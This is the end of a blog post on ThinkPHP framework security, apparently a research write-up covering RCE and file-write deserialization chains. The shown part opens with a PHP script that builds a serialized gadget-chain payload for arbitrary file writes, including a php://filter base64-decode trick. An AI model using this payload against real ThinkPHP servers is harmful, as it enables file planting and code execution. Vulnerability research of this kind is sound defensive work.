&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcache</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> \think\cache\driver\<span class="title function_ invoke__">Memcached</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">tag</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options = [</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="variable">$path</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options = [</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span> =&gt; <span class="variable">$path</span>,</span><br><span class="line"><span class="comment">//                &#x27;path&#x27; =&gt; &#x27;php://filter/convert.base64-decode/resource=&#x27; . $path,</span></span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">path</span> = &quot;<span class="title class_">file_path</span>/<span class="title class_">file_name</span>&quot;;</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;file_content&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$payload</span> = <span class="keyword">new</span> \think\<span class="title function_ invoke__">Process</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">dump_object_graph</span>(<span class="variable">$payload</span>,<span class="string">&quot;TPFW2.svg&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> ThinkPHP æ¡†æ¶å®‰å…¨</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2025-07-28 23:10:49</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-08-19 01:11:42
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2025/07/28/ThinkPHP æ¡†æ¶å®‰å…¨/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/php-web/">#php web</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/07/31/PHP%20%E7%89%B9%E6%80%A7%E4%B8%8E%E7%BB%95%E8%BF%87/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">PHP ç‰¹æ€§ä¸ç»•è¿‡</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/04/12/VS%20%E7%A0%94%E7%A9%B6/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">VS ç ”ç©¶</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">ThinkPHP æ¡†æ¶å®‰å…¨</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%9F%BA%E7%A1%80"><span class="nav-text">ç¯å¢ƒåŸºç¡€</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E5%88%9B%E5%BB%BA"><span class="nav-text">é¡¹ç›®åˆ›å»º</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84"><span class="nav-text">é¡¹ç›®ç»“æ„</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ThinkPHP5"><span class="nav-text">ThinkPHP5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ThinkPHP6"><span class="nav-text">ThinkPHP6</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8"><span class="nav-text">æ¡†æ¶ä½¿ç”¨</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MVC-%E6%9E%B6%E6%9E%84"><span class="nav-text">MVC æ¶æ„</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Controller%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%99%A8%E5%B1%82%EF%BC%88%E4%B8%9A%E5%8A%A1%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%EF%BC%89"><span class="nav-text">Controllerï¼šæ§åˆ¶å™¨å±‚ï¼ˆä¸šåŠ¡æµç¨‹æ§åˆ¶ï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Model%EF%BC%9A%E6%A8%A1%E5%9E%8B%E5%B1%82%EF%BC%88%E6%95%B0%E6%8D%AE%E8%AE%BF%E9%97%AE%E4%B8%8E%E5%B0%81%E8%A3%85%EF%BC%89"><span class="nav-text">Modelï¼šæ¨¡å‹å±‚ï¼ˆæ•°æ®è®¿é—®ä¸å°è£…ï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#View%EF%BC%9A%E8%A7%86%E5%9B%BE%E5%B1%82%EF%BC%88%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%EF%BC%89"><span class="nav-text">Viewï¼šè§†å›¾å±‚ï¼ˆé¡µé¢å±•ç¤ºï¼‰</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%9A%E6%A8%A1%E5%9D%97%E6%A8%A1%E5%BC%8F"><span class="nav-text">å¤šæ¨¡å—æ¨¡å¼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E8%AE%BF%E9%97%AE%E5%BD%A2%E5%BC%8F"><span class="nav-text">è·¯ç”±è®¿é—®å½¢å¼</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90"><span class="nav-text">æ¡†æ¶åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E7%BB%93%E6%9E%84"><span class="nav-text">æ¡†æ¶ç»“æ„</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E5%90%AF%E5%8A%A8"><span class="nav-text">æ¡†æ¶å¯åŠ¨</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E5%88%86%E5%8F%91"><span class="nav-text">è·¯ç”±åˆ†å‘</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">è¿œç¨‹ä»£ç æ‰§è¡Œ</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-%E6%B3%A8%E5%85%A5"><span class="nav-text">SQL æ³¨å…¥</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">ååºåˆ—åŒ–</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE1%EF%BC%88%E5%BD%B1%E5%93%8D-5-1-x-5-2-x%EF%BC%89"><span class="nav-text">RCE1ï¼ˆå½±å“ 5.1.x - 5.2.xï¼‰</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-text">åŸºæœ¬ä¿¡æ¯</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-text">è°ƒç”¨é“¾åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="nav-text">åˆ©ç”¨è„šæœ¬</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE2%EF%BC%88%E5%BD%B1%E5%93%8D-5-0-x%EF%BC%89"><span class="nav-text">RCE2ï¼ˆå½±å“ 5.0.xï¼‰</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-1"><span class="nav-text">åŸºæœ¬ä¿¡æ¯</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-1"><span class="nav-text">è°ƒç”¨é“¾åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC-1"><span class="nav-text">åˆ©ç”¨è„šæœ¬</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE3%EF%BC%88%E5%BD%B1%E5%93%8D-6-0-1-%EF%BC%89"><span class="nav-text">RCE3ï¼ˆå½±å“ 6.0.1+ï¼‰</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-2"><span class="nav-text">åŸºæœ¬ä¿¡æ¯</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-2"><span class="nav-text">è°ƒç”¨é“¾åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC-2"><span class="nav-text">åˆ©ç”¨è„šæœ¬</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE4%EF%BC%88%E5%BD%B1%E5%93%8D-6-0-1-%EF%BC%89"><span class="nav-text">RCE4ï¼ˆå½±å“ 6.0.1+ï¼‰</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-3"><span class="nav-text">åŸºæœ¬ä¿¡æ¯</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-3"><span class="nav-text">è°ƒç”¨é“¾åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC-3"><span class="nav-text">åˆ©ç”¨è„šæœ¬</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FW1%EF%BC%88%E5%BD%B1%E5%93%8D-5-0-4-5-0-24%EF%BC%89"><span class="nav-text">FW1ï¼ˆå½±å“ 5.0.4 - 5.0.24ï¼‰</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-4"><span class="nav-text">åŸºæœ¬ä¿¡æ¯</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-4"><span class="nav-text">è°ƒç”¨é“¾åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC-4"><span class="nav-text">åˆ©ç”¨è„šæœ¬</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FW2%EF%BC%88%E5%BD%B1%E5%93%8D-5-0-0-5-0-3%EF%BC%89"><span class="nav-text">FW2ï¼ˆå½±å“ 5.0.0 - 5.0.3ï¼‰</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-5"><span class="nav-text">åŸºæœ¬ä¿¡æ¯</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-5"><span class="nav-text">è°ƒç”¨é“¾åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC-5"><span class="nav-text">åˆ©ç”¨è„šæœ¬</span></a></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        56 posts in total
                    </span>
                    
                        <span>
                            1114.7k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="åœ–å±¤_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>